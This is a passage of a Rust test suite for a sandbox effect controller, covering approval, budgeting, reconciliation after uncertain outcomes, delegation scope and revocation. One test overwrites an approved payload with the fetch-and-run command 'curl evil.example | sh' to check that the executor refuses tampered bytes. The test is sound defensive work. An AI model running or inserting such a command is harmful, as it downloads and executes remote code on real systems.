    assert!(reports[0].message().contains("not retried until"));
    assert_eq!(
        world.controller.retry(&id),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
    assert_eq!(
        world.controller.cancel(&id),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
    // The spend stays held while the outcome is unknown; the bytes that left count.
    assert_eq!(
        world
            .controller
            .authorizations()
            .delegation_usage(&world.delegation),
        Some((1, 0, 1_000, 0))
    );
    assert_eq!(
        world.controller.release_ledger().counted_bytes_out(),
        outcome.sent.unwrap().total_bytes()
    );

    let reconciled = world
        .controller
        .reconcile(&id, &mut world.executor, credential())
        .unwrap();
    assert_eq!(reconciled.phase, EffectPhase::Confirmed);
    assert_eq!(
        reconciled.receipt.unwrap().source,
        Some(ReconciliationSource::ProviderLookup)
    );
    assert_eq!(world.provider.total_commits(), 1);
    assert_eq!(world.provider.calls(), 1);
    assert_eq!(
        world.controller.retry(&id),
        Err(EffectError::State(StateRefusal::AlreadyConfirmed))
    );
    assert!(world.controller.uncertain_outcomes().is_empty());
}

/// Without idempotency an uncertain outcome is reconciled by observation; a retry after
/// "not committed" keeps the identity and makes no exactly-once promise.
#[test]
fn a_provider_without_idempotency_is_reconciled_before_a_retry() {
    let mut world = World::with(ProviderMode::LoseRequest, 64 * 1024, 10);
    let mut f = fields();
    f.idempotency.requirement = IdempotencyRequirement::NoExactlyOnce;
    let (id, outcome) = world.run(EffectDescription::new(f).unwrap());
    assert_eq!(outcome.phase, EffectPhase::OutcomeUnknown);
    let report = &world.controller.uncertain_outcomes()[0];
    assert_eq!(report.delivery, DeliveryGuarantee::NoExactlyOnce);
    assert!(report.message().contains("cannot deduplicate"));
    // No idempotency key goes out when none was required.
    assert_eq!(world.provider.last_request().unwrap().idempotency_key, None);

    let reconciled = world
        .controller
        .reconcile(&id, &mut world.executor, credential())
        .unwrap();
    assert_eq!(reconciled.phase, EffectPhase::Failed);
    assert_eq!(
        reconciled.failure,
        Some(EffectFailure::ReconciledNotCommitted {
            source: ReconciliationSource::ProviderLookup
        })
    );
    assert_returned(&world);
    world.provider.set_mode(ProviderMode::Commit);
    world.controller.retry(&id).unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    world.controller.authorize(&id, request).unwrap();
    world.controller.reserve(&id).unwrap();
    let retried = world.dispatch(&id).unwrap();
    assert_eq!(retried.phase, EffectPhase::Confirmed);
    assert_eq!(retried.receipt.unwrap().attempt, 2);
    assert_eq!(world.controller.record(&id).unwrap().id(), id);
    assert_eq!(world.provider.total_commits(), 1);

    // A user's observation reconciles as well, and "still unknown" changes nothing.
    let mut world = World::with(ProviderMode::Partial, 64 * 1024, 10);
    let (id, outcome) = world.run(description());
    assert_eq!(outcome.phase, EffectPhase::OutcomeUnknown);
    assert!(matches!(
        world.controller.uncertain_outcomes()[0].cause,
        UnknownCause::PartialSuccess { .. }
    ));
    let still = world
        .controller
        .reconcile_with(
            &id,
            Reconciliation {
                observation: Observation::StillUnknown,
                source: ReconciliationSource::UserConfirmation,
            },
        )
        .unwrap();
    assert_eq!(still.phase, EffectPhase::OutcomeUnknown);
    assert_eq!(
        world.controller.retry(&id),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
}

/// §4.6 line 2026: a crash after the provider commits but before the receipt leaves an
/// uncertain outcome that is reconciled, never blindly retried.
#[test]
fn a_crash_between_commit_and_receipt_recovers_as_outcome_unknown() {
    let mut world = World::new();
    let (id, _) = world.run(description());
    assert_eq!(world.provider.total_commits(), 1);
    // The last state persisted before the outcome is the dispatched one: the crash point.
    let crashed = (0..world.store.count())
        .rev()
        .map(|index| world.store.snapshot(index))
        .find(|state| {
            state
                .records()
                .any(|record| record.phase() == EffectPhase::Dispatched)
        })
        .unwrap();
    let store = MemoryStore::default();
    let mut recovered = EffectController::recover(
        config(),
        world.clock.clone(),
        key(),
        world.authority.clone(),
        audit(world.clock.clone(), MemoryAuditStore::default()),
        store.clone(),
        ContractRegistry::new().with(contract()),
        crashed,
    )
    .unwrap();
    let record = recovered.record(&id).unwrap().clone();
    assert_eq!(record.phase(), EffectPhase::OutcomeUnknown);
    assert!(matches!(
        record.state(),
        EffectState::OutcomeUnknown {
            cause: UnknownCause::CrashBeforeReceipt,
            ..
        }
    ));
    // How many bytes left is unknown, so the whole reservation counts.
    assert_eq!(
        recovered.release_ledger().counted_bytes_out(),
        description().max_wire_bytes_out()
    );
    assert_eq!(recovered.release_ledger().outstanding_reserved_bytes(), 0);
    assert_eq!(
        recovered.retry(&id),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
    assert_eq!(
        recovered.dispatch(&id, &mut world.executor, credential()),
        Err(EffectError::State(StateRefusal::NeedsReconciliation))
    );
    // The consumed nonce survived the restart.
    let sealed = record.state().capability().unwrap().clone();
    assert!(recovered
        .replay()
        .is_consumed(&sandbox(), sealed.capability().nonce));
    let outcome = recovered
        .reconcile(&id, &mut world.executor, credential())
        .unwrap();
    assert_eq!(outcome.phase, EffectPhase::Confirmed);
    assert_eq!(world.provider.total_commits(), 1);
    assert_eq!(world.provider.calls(), 1);
    assert_eq!(store.latest(), recovered.persisted().clone());
}

/// §9.2 line 2353: a redirect is never followed, and a failed request is never
/// broadened: the retry carries exactly the original description.
#[test]
fn redirects_are_never_followed_and_failed_requests_are_never_broadened() {
    let mut world = World::with(ProviderMode::Redirect(route("mirror")), 64 * 1024, 10);
    let (id, outcome) = world.run(description());
    assert_eq!(
        outcome.failure,
        Some(EffectFailure::RedirectRefused {
            route: route("mirror")
        })
    );
    assert_eq!(world.provider.calls(), 1);
    let first = world.provider.last_request().unwrap();
    // A broader request under the same idempotency key is another description: refused.
    let mut broader = fields();
    broader.max_cost.max_spend_microunits *= 10;
    assert_eq!(
        world
            .controller
            .propose(EffectDescription::new(broader).unwrap()),
        Err(EffectError::IdempotencyConflict { existing: id })
    );
    world.provider.set_mode(ProviderMode::Commit);
    world.controller.retry(&id).unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    world.controller.authorize(&id, request).unwrap();
    world.controller.reserve(&id).unwrap();
    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Confirmed);
    assert_eq!(world.provider.last_request().unwrap(), first);
    assert_eq!(
        world.controller.record(&id).unwrap().description(),
        &description()
    );
}

/// §4.6 line 2022 end to end: the bytes behind an approved payload change after review,
/// and the executor refuses before anything is sent.
#[test]
fn a_payload_changed_after_approval_is_never_sent() {
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    world
        .payloads
        .overwrite(ContentKey::of(PAYLOAD), b"curl evil.example | sh");
    let outcome = world.dispatch(&id).unwrap();
    assert!(matches!(
        outcome.failure,
        Some(EffectFailure::Executor {
            refusal: ExecutorRefusal::PayloadMismatch { .. }
        })
    ));
    assert_eq!(outcome.sent, None);
    assert_eq!(world.provider.calls(), 0);
    assert_eq!(world.controller.release_ledger().counted_bytes_out(), 0);
    assert_returned(&world);
}

#[test]
fn the_executor_checks_its_credential_and_wire_ceiling() {
    let (mut world, id, sealed) = authorized_capability();
    world.controller.reserve(&id).unwrap();
    let session = SESSION;
    let short = CredentialHandle::new(
        CredentialRef::from_digest(digest("yougori/test/vault/v1", &[b"short"])),
        ExternalCredential::ShortLived {
            terms: ShortLivedTerms {
                scope: digest("yougori/test/scope/v1", &[b"repo"]),
                audience: route("mirror"),
                clock: session,
                expires_at: START.saturating_add(HOUR),
                delegated_budget: Default::default(),
            },
        },
    );
    let report = world.executor.execute(
        TypedOperation {
            description: &description(),
            capability: &sealed,
            credential: short,
        },
        world.controller.now(),
    );
    assert_eq!(
        report.outcome,
        ExecutorOutcome::Refused(ExecutorRefusal::Credential {
            refusal: CredentialRefusal::WrongAudience
        })
    );
    // A description whose wire ceiling only fits the payload cannot carry the headers.
    let mut tight = World::new();
    let mut f = fields();
    f.max_wire_bytes_out = PAYLOAD.len() as u64 + 10;
    let id = tight.prepare(EffectDescription::new(f).unwrap()).unwrap();
    let outcome = tight.dispatch(&id).unwrap();
    assert!(matches!(
        outcome.failure,
        Some(EffectFailure::Executor {
            refusal: ExecutorRefusal::WireBytesAboveCeiling { .. }
        })
    ));
    assert_eq!(tight.provider.calls(), 0);
    let wrong_executor = super::capability::ExecutorIdentity {
        name: ExecutorName::new("other-executor").unwrap(),
        build: digest("yougori/test/executor-build/v1", &[b"1.0.0"]),
    };
    assert_ne!(world.executor.identity(), &wrong_executor);
}

/// VM-P32: competing requests cannot exceed the byte or effect reservations, and unused
/// reservations return.
#[test]
fn concurrency_cannot_exceed_byte_or_effect_reservations_and_unused_ones_return() {
    // 10 000 bytes on the provider channel and 4 096 per effect: two fit, the third not.
    let mut world = World::with(ProviderMode::Commit, 10_000, 10);
    let first = world
        .prepare(EffectDescription::new(fields_numbered(1)).unwrap())
        .unwrap();
    let second = world
        .prepare(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();
    let third = world.prepare(EffectDescription::new(fields_numbered(3)).unwrap());
    assert!(matches!(
        third,
        Err(EffectError::Refused {
            failure: EffectFailure::Release { ref refusal }
        }) if refusal.reason == ReleaseRefusalReason::ChannelBudgetExhausted {
            requested_bytes: 4_096,
            available_bytes: 10_000 - 2 * 4_096
        }
    ));
    let dispatched = world.dispatch(&first).unwrap();
    world.controller.cancel(&second).unwrap();
    let ledger = world.controller.release_ledger();
    assert_eq!(ledger.outstanding_reserved_bytes(), 0);
    assert_eq!(
        ledger.counted_bytes_out(),
        dispatched.sent.unwrap().total_bytes()
    );
    assert_eq!(ledger.invariant_violation(), None);
    // The bytes returned: a new effect fits again.
    let fourth = world.prepare(EffectDescription::new(fields_numbered(4)).unwrap());
    assert!(fourth.is_ok());

    // A delegation of one effect: the second reservation is refused until the first
    // certainly did not commit.
    let mut world = World::with(ProviderMode::Reject, 64 * 1024, 1);
    let a = world
        .prepare(EffectDescription::new(fields_numbered(1)).unwrap())
        .unwrap();
    let b = world
        .controller
        .propose(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();
    world.controller.validate(&b).unwrap();
    let request = world.request();
    world.controller.authorize(&b, request).unwrap();
    assert_eq!(
        world.controller.reserve(&b),
        Err(EffectError::Refused {
            failure: EffectFailure::Budget {
                refusal: BudgetRefusal::EffectsExhausted {
                    max_effects: 1,
                    committed_effects: 1
                }
            }
        })
    );
    let rejected = world.dispatch(&a).unwrap();
    assert_eq!(rejected.phase, EffectPhase::Failed);
    world.provider.set_mode(ProviderMode::Commit);
    world.controller.retry(&b).unwrap();
    world.controller.validate(&b).unwrap();
    let request = world.request();
    world.controller.authorize(&b, request).unwrap();
    world.controller.reserve(&b).unwrap();
    assert_eq!(world.dispatch(&b).unwrap().phase, EffectPhase::Confirmed);
    assert_eq!(
        world
            .controller
            .authorizations()
            .delegation_usage(&world.delegation),
        Some((0, 1, 0, 400))
    );
}

/// VM-P33: every declared release channel counts URLs, headers, names and framing, and
/// an undeclared channel releases nothing.
#[test]
fn every_release_channel_is_counted() {
    let mut world = World::new();
    let measure = WireMeasure {
        body_bytes: 10,
        header_bytes: 20,
        url_bytes: 30,
        name_bytes: 5,
        framing_bytes: 7,
    };
    let channels = [
        (
            ReleaseChannelKind::ProviderRequest,
            TrustClass::RegisteredProvider,
        ),
        (
            ReleaseChannelKind::TransportStream,
            TrustClass::PublicNetwork,
        ),
        (ReleaseChannelKind::DnsQuery, TrustClass::DnsResolver),
        (
            ReleaseChannelKind::PublishedServiceResponse,
            TrustClass::PublicNetwork,
        ),
        (ReleaseChannelKind::File, TrustClass::HostStorage),
        (ReleaseChannelKind::TerminalOutput, TrustClass::HostUser),
        (ReleaseChannelKind::Log, TrustClass::HostStorage),
        (ReleaseChannelKind::BrowserPreview, TrustClass::HostUser),
        (
            ReleaseChannelKind::UserApprovedTransfer,
            TrustClass::PublicNetwork,
        ),
    ];
    assert_eq!(channels.len(), ReleaseChannelKind::ALL.len());
    let mut expected = 0;
    for (kind, trust) in channels {
        let channel = ChannelKey { kind, trust };
        let reservation = world.controller.reserve_release(channel, 200).unwrap();
        let charge = world
            .controller
            .charge_release(reservation.token, &measure)
            .unwrap();
        assert_eq!(charge.counted_bytes, 72, "{kind:?}");
        expected += 72;
        assert_eq!(
            world.controller.return_release(reservation.token).unwrap(),
            128
        );
        assert_eq!(
            world.controller.release_ledger().counted_bytes_out(),
            expected
        );
    }
    // A short DNS query still counts its floor.
    let dns = ChannelKey {
        kind: ReleaseChannelKind::DnsQuery,
        trust: TrustClass::DnsResolver,
    };
    let query = world.controller.reserve_release(dns, 64).unwrap();
    let charge = world
        .controller
        .charge_release(
            query.token,
            &WireMeasure {
                name_bytes: 12,
                framing_bytes: 4,
                ..WireMeasure::default()
            },
        )
        .unwrap();
    assert_eq!(charge.counted_bytes, 64);
    // Terminal output to the public network is not a declared channel.
    let undeclared = world.controller.reserve_release(
        ChannelKey {
            kind: ReleaseChannelKind::TerminalOutput,
            trust: TrustClass::PublicNetwork,
        },
        1,
    );
    assert!(matches!(
        undeclared,
        Err(EffectError::Release(ref refusal))
            if refusal.reason == ReleaseRefusalReason::UndeclaredChannel
    ));
    let ledger = world.controller.release_ledger();
    assert!(ledger.counted_bytes_out() <= ledger.ceiling_bytes());
    assert_eq!(ledger.invariant_violation(), None);
    assert_eq!(
        ledger.policy().general_budget_bytes(),
        DEFAULT_GENERAL_RELEASE_BUDGET_BYTES
    );
}

/// CORE-06: a dispatch goes ahead only on an audit receipt, and storage failures stop it
/// before anything is sent.
#[test]
fn the_audit_journal_and_the_store_gate_the_dispatch() {
    let mut world = World::new();
    let id = world.prepare(description()).unwrap();
    *world.audit_store.refuse.lock().unwrap() = true;
    assert!(matches!(world.dispatch(&id), Err(EffectError::Audit(_))));
    assert_eq!(
        world.controller.record(&id).unwrap().phase(),
        EffectPhase::Reserved
    );
    assert_eq!(world.provider.calls(), 0);
    *world.audit_store.refuse.lock().unwrap() = false;

    *world.store.refuse.lock().unwrap() = true;
    assert!(matches!(world.dispatch(&id), Err(EffectError::Store(_))));
    assert_eq!(
        world.controller.record(&id).unwrap().phase(),
        EffectPhase::Reserved
    );
    assert_eq!(world.provider.calls(), 0);
    *world.store.refuse.lock().unwrap() = false;

    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Confirmed);
    assert_eq!(world.provider.calls(), 1);
}

// ---------------------------------------------------------------------------------------
// Delegation (§4.6)
// ---------------------------------------------------------------------------------------

/// §4.6 line 2014: a generation restart alone does not ask again; the capability binds
/// the new generation, and an old one is refused.
#[test]
fn standing_delegation_is_reused_across_a_generation_restart() {
    let mut world = World::new();
    let (_, outcome) = world.run(EffectDescription::new(fields_numbered(1)).unwrap());
    assert_eq!(outcome.phase, EffectPhase::Confirmed);
    let pending = world
        .prepare(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();

    world.authority.reboot(&execution("exe-a"));
    world
        .authority
        .grant(&execution("exe-a"), START.saturating_add(10 * HOUR));
    world.lease = world
        .authority
        .issue_lease(&execution("exe-a"), START.saturating_add(10 * HOUR));
    let stale = world.dispatch(&pending).unwrap();
    assert!(matches!(
        stale.failure,
        Some(EffectFailure::BootGenerationChanged { .. })
    ));

    let id = world
        .controller
        .propose(EffectDescription::new(fields_numbered(3)).unwrap())
        .unwrap();
    world.controller.validate(&id).unwrap();
    let request = world.request();
    let sealed = world.controller.authorize(&id, request).unwrap();
    assert_eq!(
        sealed.capability().generations.boot,
        SandboxBootGeneration::new(2)
    );
    assert_eq!(
        sealed.capability().generations.authorization,
        AuthorizationEpoch::new(2)
    );
    world.controller.reserve(&id).unwrap();
    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Confirmed);
}

/// §4.6 line 2014: material scope changes, new destinations and new operations need
/// reauthorization; narrower ones do not.
#[test]
fn material_scope_changes_need_reauthorization() {
    let granted = delegation(10);
    assert_eq!(granted.change_to(&granted), ScopeChange::Same);
    let mut narrower = granted.clone();
    narrower.scope.max_wire_bytes_per_effect = 1;
    narrower.budget.max_effects = 1;
    assert_eq!(granted.change_to(&narrower), ScopeChange::Narrower);
    type Change = fn(&mut super::delegation::StandingDelegation);
    let cases: Vec<(MaterialChange, Change)> = vec![
        (MaterialChange::NewOperation, |d| {
            d.scope.operations.insert(operation("merge_change_request"));
        }),
        (MaterialChange::NewDestination, |d| {
            d.scope.routes.insert(route("mirror"));
        }),
        (MaterialChange::NewAccount, |d| {
            d.scope.accounts.insert(account("org-b"));
        }),
        (MaterialChange::HigherCost, |d| {
            d.scope.max_cost_per_effect.max_spend_microunits += 1
        }),
        (MaterialChange::MoreWireBytes, |d| {
            d.scope.max_wire_bytes_per_effect += 1
        }),
        (MaterialChange::LargerBudget, |d| d.budget.max_effects += 1),
        (MaterialChange::LaterExpiry, |d| {
            d.expires.at = d.expires.at.saturating_add(SECOND)
        }),
        (MaterialChange::OtherExecutor, |d| {
            d.scope.executor = ExecutorName::new("other-executor").unwrap()
        }),
        (MaterialChange::OtherPrincipal, |d| {
            d.scope.principal = crate::foundation::ids::TenantId::new("tenant-b").unwrap()
        }),
        (MaterialChange::OtherSandbox, |d| {
            d.scope.sandbox.execution = execution("exe-b")
        }),
        (MaterialChange::OtherPolicy, |d| {
            d.policy = PolicyEpoch::new(2)
        }),
    ];
    for (change, mutate) in cases {
        let mut proposed = granted.clone();
        mutate(&mut proposed);
        assert_eq!(
            granted.change_to(&proposed),
            ScopeChange::Material {
                changes: BTreeSet::from([change])
            },
            "{change:?}"
        );
    }

    // What the grant covers, and what it refuses.
    let executor = executor_identity();
    let now = START;
    let covers = |mutate: fn(&mut EffectFields)| {
        let mut f = fields();
        mutate(&mut f);
        granted.covers(
            &EffectDescription::new(f).unwrap(),
            &executor,
            PolicyEpoch::FIRST,
            now,
            SESSION,
        )
    };
    assert_eq!(covers(|_| {}), Ok(()));
    assert_eq!(
        covers(|f| f.operation = operation("merge_change_request")),
        Err(ScopeViolation::NewOperation)
    );
    assert_eq!(
        covers(|f| f.destination.route = route("mirror")),
        Err(ScopeViolation::NewDestination)
    );
    assert_eq!(
        covers(|f| f.resource.account = account("org-b")),
        Err(ScopeViolation::NewAccount)
    );
    assert_eq!(
        covers(|f| f.max_cost.max_spend_microunits = 10_001),
        Err(ScopeViolation::CostAboveCeiling)
    );
    assert_eq!(
        covers(|f| f.max_wire_bytes_out = 8_193),
        Err(ScopeViolation::WireBytesAboveCeiling)
    );
    assert_eq!(
        covers(|f| f.sandbox.execution = execution("exe-b")),
        Err(ScopeViolation::OtherSandbox)
    );
    assert_eq!(
        granted.covers(&description(), &executor, PolicyEpoch::new(2), now, SESSION),
        Err(ScopeViolation::PolicyChanged {
            granted: PolicyEpoch::FIRST,
            current: PolicyEpoch::new(2)
        })
    );
    assert!(matches!(
        granted.covers(
            &description(),
            &executor,
            PolicyEpoch::FIRST,
            START.saturating_add(10 * HOUR),
            SESSION
        ),
        Err(ScopeViolation::Expired { .. })
    ));
    assert_eq!(
        granted.covers(
            &description(),
            &executor,
            PolicyEpoch::FIRST,
            now,
            ClockSession::from_uuid(uuid::Uuid::from_u128(5))
        ),
        Err(ScopeViolation::OtherClock)
    );
}

/// VM-W31: individual approval covers one effect identity, once; after a certain
/// non-commit the same identity may use it again.
#[test]
fn an_individual_approval_covers_exactly_one_effect() {
    let mut world = World::with(ProviderMode::Reject, 64 * 1024, 10);
    let deadline = Deadline {
        clock: SESSION,
        at: START.saturating_add(HOUR),
    };
    let approval = IndividualApproval::for_description(
        &description(),
        Some(ReviewedArtifact::of_displayed(PAYLOAD)),
        PolicyEpoch::FIRST,
        deadline,
    )
    .unwrap();
    let approval_id = world.controller.approve(approval).unwrap();
    let individual = AuthorizationRequest {
        basis: AuthorizationBasis::Individual {
            approval: approval_id,
        },
        ..world.request()
    };
    let id = world.controller.propose(description()).unwrap();
    world.controller.validate(&id).unwrap();
    world.controller.authorize(&id, individual.clone()).unwrap();
    world.controller.reserve(&id).unwrap();
    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Failed);

    let other = world
        .controller
        .propose(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();
    world.controller.validate(&other).unwrap();
    assert_eq!(
        world.controller.authorize(&other, individual.clone()),
        Err(EffectError::Refused {
            failure: EffectFailure::Authorization {
                violation: ScopeViolation::OtherEffect
            }
        })
    );

    world.provider.set_mode(ProviderMode::Commit);
    world.controller.retry(&id).unwrap();
    world.controller.validate(&id).unwrap();
    world.controller.authorize(&id, individual).unwrap();
    world.controller.reserve(&id).unwrap();
    assert_eq!(world.dispatch(&id).unwrap().phase, EffectPhase::Confirmed);

    // The book refuses a second hold and any use after the committed one.
    let mut book = AuthorizationBook::new();
    let approval =
        IndividualApproval::for_description(&description(), None, PolicyEpoch::FIRST, deadline)
            .unwrap();
    let approval_id = book.approve(approval);
    let basis = AuthorizationBasis::Individual {
        approval: approval_id,
    };
    book.reserve(basis, description().id(), 0).unwrap();
    assert_eq!(
        book.reserve(basis, description().id(), 0),
        Err(BudgetRefusal::AlreadyHeld)
    );
    book.consume(&description().id()).unwrap();
    assert_eq!(
        book.consume(&description().id()),
        Err(BudgetRefusal::NotHeld)
    );
    book.settle(&description().id(), true, 0).unwrap();
    assert_eq!(
        book.reserve(basis, description().id(), 0),
        Err(BudgetRefusal::ApprovalInUse)
    );
}

// ---------------------------------------------------------------------------------------
// Revocation (§2.5 lines 1819–1824; §6.3; VM-P14)
// ---------------------------------------------------------------------------------------

/// §6.3: the tombstone is the linearization point; committed actions stay committed.
#[test]
fn revocation_linearizes_at_the_tombstone_and_never_revokes_committed_effects() {
    let mut world = World::new();
    let (confirmed, _) = world.run(EffectDescription::new(fields_numbered(1)).unwrap());
    let reserved = world
        .prepare(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();
    world.provider.set_mode(ProviderMode::CommitLoseReply);
    let (uncertain, _) = world.run(EffectDescription::new(fields_numbered(3)).unwrap());
    let waiting = world
        .controller
        .propose(EffectDescription::new(fields_numbered(4)).unwrap())
        .unwrap();
    world.controller.validate(&waiting).unwrap();
    let receipt_before = world.controller.record(&confirmed).unwrap().state().clone();

    let report = world
        .controller
        .revoke(
            &sandbox(),
            AuthorizationEpoch::FIRST,
            RevocationReason::SecurityEvent,
        )
        .unwrap();
    assert_eq!(report.cancelled, vec![reserved]);
    assert_eq!(report.in_flight, vec![uncertain]);
    assert!(report.audited);
    assert_eq!(
        report
            .record
            .acknowledged(RevocationAck::NewAuthorizationsDenied)
            .unwrap()
            .at,
        world.controller.now()
    );
    // Committed is committed.
    assert_eq!(
        world.controller.record(&confirmed).unwrap().state(),
        &receipt_before
    );
    let failed = world.controller.record(&reserved).unwrap();
    assert!(matches!(
        failed.state(),
        EffectState::Failed {
            failure: EffectFailure::Revoked { .. }
        }
    ));
    assert_eq!(
        world
            .controller
            .release_ledger()
            .outstanding_reserved_bytes(),
        0
    );

    // The coordinator has not advanced its epoch yet, but the tombstone already denies.
    let request = world.request();
    assert_eq!(
        world.controller.authorize(&waiting, request),
        Err(EffectError::Refused {
            failure: EffectFailure::Revoked {
                through: AuthorizationEpoch::FIRST
            }
        })
    );

    // The acknowledgments are distinct and each needs its own evidence.
    let record = world
        .controller
        .revocations()
        .record(&sandbox())
        .unwrap()
        .clone();
    for ack in [
        RevocationAck::SocketsClosed,
        RevocationAck::VmStopped,
        RevocationAck::ProviderStoppedBilling,
        RevocationAck::DiskCleanupFinished,
    ] {
        assert_eq!(record.acknowledged(ack), None, "{ack:?}");
    }
    assert_eq!(
        world.controller.acknowledge(
            &sandbox(),
            RevocationAck::VmStopped,
            SourceClass::GuestReport
        ),
        Err(EffectError::Ack(AckRefusal::InsufficientSource {
            ack: RevocationAck::VmStopped,
            minimum: SourceClass::HostProbe,
            source: SourceClass::GuestReport
        }))
    );
    world
        .controller
        .acknowledge(
            &sandbox(),
            RevocationAck::SocketsClosed,
            SourceClass::HostProbe,
        )
        .unwrap();
    let record = world.controller.revocations().record(&sandbox()).unwrap();
    assert!(record.acknowledged(RevocationAck::SocketsClosed).is_some());
    assert_eq!(record.acknowledged(RevocationAck::VmStopped), None);
    assert!(record.uncertain.contains(&uncertain));

    // The uncertain effect is reconciled after the revocation; it committed, so it stays.
    let outcome = world
        .controller
        .reconcile(&uncertain, &mut world.executor, credential())
        .unwrap();
    assert_eq!(outcome.phase, EffectPhase::Confirmed);
    assert!(world
        .controller
        .revocations()
        .record(&sandbox())
        .unwrap()
        .uncertain
        .is_empty());
    // Once the coordinator's own epoch advances, it refuses on its own as well.
    let current = world.authority.revoke(&execution("exe-a"));
    assert_eq!(current, AuthorizationEpoch::new(2));
    let request = world.request();
    world.controller.retry(&waiting).unwrap();
    world.controller.validate(&waiting).unwrap();
    assert_eq!(
        world.controller.authorize(&waiting, request),
        Err(EffectError::Refused {
            failure: EffectFailure::NoAuthority
        })
    );
}

/// §2.5 lines 1821–1822 through the controller's own counts.
#[test]
fn post_revocation_bounds_count_outstanding_reserved_effects() {
    let mut world = World::with(ProviderMode::CommitLoseReply, 64 * 1024, 10);
    world
        .prepare(EffectDescription::new(fields_numbered(1)).unwrap())
        .unwrap();
    world
        .prepare(EffectDescription::new(fields_numbered(2)).unwrap())
        .unwrap();
    world.run(EffectDescription::new(fields_numbered(3)).unwrap());
    assert_eq!(world.controller.outstanding_reserved_effects(&sandbox()), 3);
    let point = EnforcementPoint {
        checks_leases: true,
        can_mint_renewals: false,
    };
    let bounds = world
        .controller
        .post_revocation_bounds(&sandbox(), point, 30 * SECOND, 5)
        .unwrap();
    assert_eq!(bounds.remaining_authorized_time, 32 * SECOND);
    assert_eq!(bounds.remaining_effects, 8);
    assert!(world
        .controller
        .post_revocation_bounds(
            &sandbox(),
            EnforcementPoint {
                checks_leases: false,
                can_mint_renewals: false
            },
            30 * SECOND,
            5
        )
        .is_err());
}

#[test]
fn compaction_keeps_live_replay_records_and_removes_dead_ones() {
    let mut world = World::new();
    world.run(description());
    assert_eq!(world.controller.replay().recorded(), 1);
    assert_eq!(world.controller.compact().unwrap(), (0, 0));
    // Past the capability's expiry plus the 2 s clock uncertainty, nothing can carry it.
    world.clock.advance(63 * SECOND);
    assert_eq!(world.controller.compact().unwrap(), (1, 0));
    assert_eq!(world.controller.replay().recorded(), 0);
}

#[test]
fn persisted_state_round_trips_and_refuses_tampering() {
    let mut world = World::new();
    world.run(description());
    let persisted = world.controller.persisted().clone();
    let json = serde_json::to_value(&persisted).unwrap();
    assert_eq!(
        serde_json::from_value::<super::controller::PersistedEffects>(json.clone()).unwrap(),
        persisted
    );
    let mut extra = json.clone();
    extra["shadow"] = json!([]);
    assert!(serde_json::from_value::<super::controller::PersistedEffects>(extra).is_err());
    // Moving a record under another identity is detected at recovery.
    let mut moved = json;
    let records = moved["records"].as_object_mut().unwrap();
    let (key, value) = records
        .iter()
        .next()
        .map(|(k, v)| (k.clone(), v.clone()))
        .unwrap();
    records.remove(&key);
    records.insert(hex("elsewhere"), value);
    let moved: super::controller::PersistedEffects = serde_json::from_value(moved).unwrap();
    assert!(matches!(
        EffectController::recover(
            config(),
            world.clock.clone(),
            key_fn(),
            world.authority.clone(),
            audit(world.clock.clone(), MemoryAuditStore::default()),
            MemoryStore::default(),
            ContractRegistry::new().with(contract()),
            moved,
        ),
        Err(EffectError::CorruptState { .. })
    ));
}

fn key_fn() -> CapabilityKey {
    key()
}

// ---------------------------------------------------------------------------------------
// §12.3 models 2 and 4, and the VM-N2 comparison
// ---------------------------------------------------------------------------------------

#[test]
fn model_2_effect_state_machine_holds_exhaustively() {
    let report = check_effect_model(EffectModelBounds {
        max_depth: 40,
        max_attempts: 3,
        blind_retry: false,
    })
    .unwrap();
    assert!(report.states > 40, "{report:?}");
    assert!(report.transitions > report.states);
    assert!(!report.assumptions.is_empty());
}

/// With blind reconciliation injected the model finds a counterexample, so its
/// invariants are not vacuous.
#[test]
fn model_2_catches_a_blind_retry() {
    let counterexample = check_effect_model(EffectModelBounds {
        max_depth: 40,
        max_attempts: 3,
        blind_retry: true,
    })
    .unwrap_err();
    // The first violation reached is a "failed" effect the provider had in fact
    // committed: the blind reconciliation; retrying it would commit twice.
    assert_eq!(
        counterexample.violation, "a failed effect had committed",
        "{counterexample:?}"
    );
    assert!(counterexample
        .trace
        .iter()
        .any(|event| event == "Reconcile"));
}

#[test]
fn model_4_budget_reservations_hold_exhaustively() {
    let report = check_budget_model(BudgetModelBounds {
        operations: 3,
        max_reserve_bytes: 2,
        max_charge_bytes: 1,
    })
    .unwrap();
    // Three operations contend for a 3-byte channel and a 1-byte allowance.
    assert!(report.states > 1_000, "{report:?}");
    assert!(report.deepest >= 10, "{report:?}");
}

/// VM-N2 (§9.2 line 2359) on fakes: only immutable effect authorization blocks every
/// mutation of the corpus while completing the legitimate requests.
#[test]
fn the_mutation_corpus_compares_the_three_approval_modes() {
    let comparison = run_mutation_corpus().unwrap();
    assert_eq!(comparison.mutations, 15);
    let immutable = comparison.result(ApprovalMode::ImmutableEffect).unwrap();
    assert_eq!((immutable.blocked, immutable.completed), (15, 2));
    assert!(immutable.missed.is_empty());
    let route_only = comparison.result(ApprovalMode::RouteOnly).unwrap();
    assert_eq!((route_only.blocked, route_only.completed), (1, 2));
    let mutable = comparison.result(ApprovalMode::MutableRequest).unwrap();
    assert_eq!((mutable.blocked, mutable.completed), (8, 2));
    assert_eq!(
        mutable.missed,
        vec![
            "maximum cost",
            "wire bytes",
            "preconditions",
            "idempotency requirement",
            "deadline",
            "payload bytes in place",
            "attachment bytes in place"
        ]
    );
}

// ---------------------------------------------------------------------------------------
// Through the real CORE-04 coordinator
// ---------------------------------------------------------------------------------------

mod coordinator {
    use std::collections::{BTreeMap, BTreeSet};
    use std::sync::{Arc, Mutex, PoisonError};

    use super::*;
